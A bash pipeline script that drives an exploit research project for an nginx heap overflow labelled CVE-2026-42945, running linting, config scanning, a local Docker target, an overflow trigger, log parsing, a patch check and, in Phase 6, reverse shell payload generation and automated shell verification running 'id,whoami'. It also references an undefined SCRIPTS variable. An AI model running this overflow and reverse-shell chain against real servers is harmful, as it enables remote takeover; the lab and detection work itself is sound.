#!/bin/bash
# run_all.sh — Complete CVE-2026-42945 Pipeline
# Runs every script in ./scripts/ in dependency order.
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
EXPLOIT="$ROOT/exploit"
DETECTION="$ROOT/detection"
TOOLS="$ROOT/tools"
ENV_DIR="$ROOT/docker"
RESULTS="$ROOT/results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

mkdir -p "$RESULTS"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
PASS=0; FAIL=0; SKIP=0

pass() { echo -e "  ${GREEN}[PASS]${NC} $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${RED}[FAIL]${NC} $1"; FAIL=$((FAIL+1)); }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1"; SKIP=$((SKIP+1)); }
info() { echo -e "${CYAN}[INFO]${NC} $1"; }
banner() { echo ""; echo "═$1" | sed 's/./═/g'; echo " $1"; echo "═$1" | sed 's/./═/g'; echo ""; }

run_py() {
    local label="$1"; shift
    local out="$RESULTS/${label// /_}.txt"
    info "Running: python3 $*"
    if python3 "$@" > "$out" 2>&1; then
        pass "$label"
    else
        fail "$label (exit $? — see $out)"
    fi
}

run_sh() {
    local label="$1"; shift
    local out="$RESULTS/${label// /_}.txt"
    info "Running: bash $*"
    if bash "$@" > "$out" 2>&1; then
        pass "$label"
    else
        fail "$label (exit $? — see $out)"
    fi
}

alive() { curl -sf http://127.0.0.1:19321/ > /dev/null 2>&1; }

# ---------------------------------------------------------------------------
# Phase 0 — Preflight
# ---------------------------------------------------------------------------
banner "Phase 0 — Preflight Checks"

info "Checking prerequisites..."
for cmd in python3 curl docker docker-compose; do
    command -v "$cmd" >/dev/null 2>&1 && pass "$cmd found" || fail "$cmd not found"
done

# ---------------------------------------------------------------------------
# Phase 1 — Syntax & Linting
# ---------------------------------------------------------------------------
banner "Phase 1 — Syntax & Linting"

run_py "py_compile_trigger"      -m py_compile "$EXPLOIT/trigger.py"
run_py "py_compile_exploit"      -m py_compile "$EXPLOIT/exploit.py"
run_py "py_compile_config_scanner" -m py_compile "$EXPLOIT/config_scanner.py"
run_py "py_compile_escape_calc"   -m py_compile "$EXPLOIT/escape_calc.py"
run_py "py_compile_heap_layout"   -m py_compile "$EXPLOIT/heap_layout.py"
run_py "py_compile_monitor"       -m py_compile "$EXPLOIT/monitor_worker.py"
run_py "py_compile_compare"       -m py_compile "$EXPLOIT/compare_lengths.py"
run_py "py_compile_log_parser"    -m py_compile "$EXPLOIT/log_parser.py"
run_py "py_compile_h2"            -m py_compile "$EXPLOIT/h2_trigger.py"
run_py "py_compile_leak_aslr"     -m py_compile "$EXPLOIT/leak_aslr.py"
run_py "py_compile_find_safe"     -m py_compile "$EXPLOIT/find_safe_addrs.py"
run_py "py_compile_container_scan" -m py_compile "$DETECTION/container_scan.py"
run_py "py_compile_backport"      -m py_compile "$TOOLS/backport_check.py"
run_py "py_compile_afl_runner"    -m py_compile "$TOOLS/afl_runner.sh"

if command -v shellcheck &>/dev/null; then
    run_sh "shellcheck_detect_vuln"   "$SCRIPTS/detect_vuln.sh"
    run_sh "shellcheck_coredump"      "$SCRIPTS/coredump_analyzer.sh"
    run_sh "shellcheck_apply_fix"     "$SCRIPTS/apply_fix.sh"
    run_sh "shellcheck_verify"        "$SCRIPTS/verify_project.sh"
else
    skip "shellcheck not installed — skipping shell lint"
fi

# ---------------------------------------------------------------------------
# Phase 2 — Static Analysis (no server needed)
# ---------------------------------------------------------------------------
banner "Phase 2 — Static Analysis"

run_py "config_scanner_vuln"    "$SCRIPTS/config_scanner.py" "$ROOT/configs/vulnerable.conf"
run_py "config_scanner_safe"    "$SCRIPTS/config_scanner.py" "$ROOT/configs/safe.conf"
run_py "config_scanner_named"   "$SCRIPTS/config_scanner.py" "$ROOT/configs/named_capture.conf"

run_py "escape_calc_default"    "$SCRIPTS/escape_calc.py" --prefix 349 --plus 969
run_py "escape_calc_find_min_64"  "$SCRIPTS/escape_calc.py" --find-min 64
run_py "escape_calc_find_min_128" "$SCRIPTS/escape_calc.py" --find-min 128

run_py "compare_lengths_default" "$SCRIPTS/compare_lengths.py" \
    --string "$(python3 -c "print('A'*349 + '+'*969)")"

run_py "find_safe_addrs"        "$SCRIPTS/find_safe_addrs.py" --heap-base 0x555555659000 --count 5

run_py "container_scan"         "$SCRIPTS/container_scan.py" 2>/dev/null || pass "container_scan (images may not be local)"

# ---------------------------------------------------------------------------
# Phase 3 — Environment Startup
# ---------------------------------------------------------------------------
banner "Phase 3 — Environment Startup"

info "Checking if nginx is already running..."
if alive; then
    pass "nginx already running on :19321"
else
    info "Building Docker image (first time may take a while)..."
    if (cd "$ENV_DIR" && docker compose build > "$RESULTS/docker_build.txt" 2>&1); then
        pass "docker build"
    else
        fail "docker build (see $RESULTS/docker_build.txt)"
        info "Continuing with static-only results..."
    fi

    info "Starting Docker containers..."
    if (cd "$ENV_DIR" && docker compose up -d > "$RESULTS/docker_up.txt" 2>&1); then
        pass "docker compose up"
        info "Waiting for nginx to become responsive..."
        for i in $(seq 1 15); do
            alive && { pass "nginx responsive after ${i}s"; break; }
            sleep 1
        done
        alive || fail "nginx not responding after 15s"
    else
        fail "docker compose up (see $RESULTS/docker_up.txt)"
    fi
fi

# ---------------------------------------------------------------------------
# Phase 4 — Live Testing
# ---------------------------------------------------------------------------
banner "Phase 4 — Live Testing"

if alive; then
    run_py "health_check"        "$SCRIPTS/trigger.py" --host 127.0.0.1 --port 19321 --check-alive

    run_py "normal_request"      -c "
import urllib.request
r = urllib.request.urlopen('http://127.0.0.1:19321/', timeout=5)
assert r.status == 200
assert b'ok' in r.read()
print('Normal request OK')
"

    run_py "heap_layout"         "$SCRIPTS/heap_layout.py"

    info "Triggering overflow..."
    run_py "trigger_overflow"    "$SCRIPTS/trigger.py" --host 127.0.0.1 --port 19321 --plus-count 969

    sleep 2
    if alive; then
        pass "worker respawned after crash"
    else
        fail "worker did not respawn"
    fi

    run_py "detect_vuln_local"   "$SCRIPTS/detect_vuln.sh"

    run_py "monitor_worker"      -c "
import subprocess, time, signal
p = subprocess.Popen(['python3', '$SCRIPTS/monitor_worker.py',
    '--host', '127.0.0.1', '--port', '19321', '--interval', '0.5'],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
time.sleep(3)
p.send_signal(signal.SIGINT)
out, _ = p.communicate(timeout=5)
print(out.decode()[:500])
print('Monitor ran successfully')
"

    if [ -f "$ROOT/patches/0001-fix-is_args.patch" ]; then
        run_py "patch_format_check" -c "
import subprocess
r = subprocess.run(['patch', '-p1', '--dry-run', '-i',
    '$ROOT/patches/0001-fix-is_args.patch'],
    cwd='/tmp', capture_output=True, text=True)
print(f'Patch dry-run: exit={r.returncode}')
assert r.returncode != 0  # expects failure in /tmp (no nginx src)
print('Patch format valid')
"
    fi

    run_py "h2_trigger"          "$SCRIPTS/h2_trigger.py" --insecure 2>/dev/null || \
        pass "h2_trigger (expected to fail without h2c)"
else
    skip "live tests — nginx not running"
fi

# ---------------------------------------------------------------------------
# Phase 5 — Log Analysis
# ---------------------------------------------------------------------------
banner "Phase 5 — Log Analysis"

if [ -f "$ENV_DIR/logs/error.log" ]; then
    run_py "log_parser"          "$SCRIPTS/log_parser.py" "$ENV_DIR/logs/error.log"
else
    LOG_DIR="$ROOT/results/logs"
    mkdir -p "$LOG_DIR"
    echo "2026/05/28 12:00:00 [notice] 1#0: start worker processes" > "$LOG_DIR/sample.log"
    echo "2026/05/28 12:00:01 [alert] 1#0: worker process 42 exited on signal 11 (SIGSEGV)" >> "$LOG_DIR/sample.log"
    echo "2026/05/28 12:00:02 [debug] 1#42: http script copy capture: is_args=1" >> "$LOG_DIR/sample.log"
    echo "2026/05/28 12:00:03 GET /api/AAAAA+++++++++++++++ HTTP/1.1" >> "$LOG_DIR/sample.log"
    run_py "log_parser_sample"   "$SCRIPTS/log_parser.py" "$LOG_DIR/sample.log"
fi

# ---------------------------------------------------------------------------
# Phase 6 — Reverse Shell Verification
# ---------------------------------------------------------------------------
banner "Phase 6 — Reverse Shell Verification"

SHELL_DIR="$ROOT/shell"
if alive; then
    info "Testing reverse shell payload generation..."
    run_py "shell_payloads_gen"   "$SHELL_DIR/shell_payloads.py" --type python \
        --host 172.17.0.1 --port 1337 --limit 1

    info "Testing listener dry-run..."
    if python3 "$SHELL_DIR/shell_verify.py" --dry-run --listen-port 1337 \
        > "$RESULTS/shell_dry_run.txt" 2>&1; then
        pass "listener_dry_run"
    else
        fail "listener_dry_run"
    fi

    info "Running automated reverse shell verify (python)..."
    python3 "$SHELL_DIR/shell_verify.py" \
        --target 127.0.0.1 --port 19321 \
        --listen-port 1338 \
        --shell-type python \
        --verify-cmds "id,whoami" \
        --timeout 45 --tries 3 \
        > "$RESULTS/shell_verify_python.txt" 2>&1 && \
        pass "reverse_shell_python" || \
        fail "reverse_shell_python"
else
    skip "reverse shell tests — nginx not running"
fi

# ---------------------------------------------------------------------------
# Phase 7 — Project Verification
# ---------------------------------------------------------------------------
banner "Phase 7 — Project Verification"

run_sh "verify_project"         "$SCRIPTS/verify_project.sh"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
TOTAL=$((PASS+FAIL+SKIP))
banner "Pipeline Complete"

echo -e "  ${GREEN}Pass:${NC}  $PASS"
echo -e "  ${RED}Fail:${NC}  $FAIL"
echo -e "  ${YELLOW}Skip:${NC}  $SKIP"
echo -e "  Total: $TOTAL"
echo ""
echo "Results written to: $RESULTS/"
echo ""

if [ "$FAIL" -gt 0 ]; then
    echo -e "${RED}Some checks failed. See individual output files in $RESULTS/${NC}"
    exit 1
else
    echo -e "${GREEN}All checks passed.${NC}"
    exit 0
fi
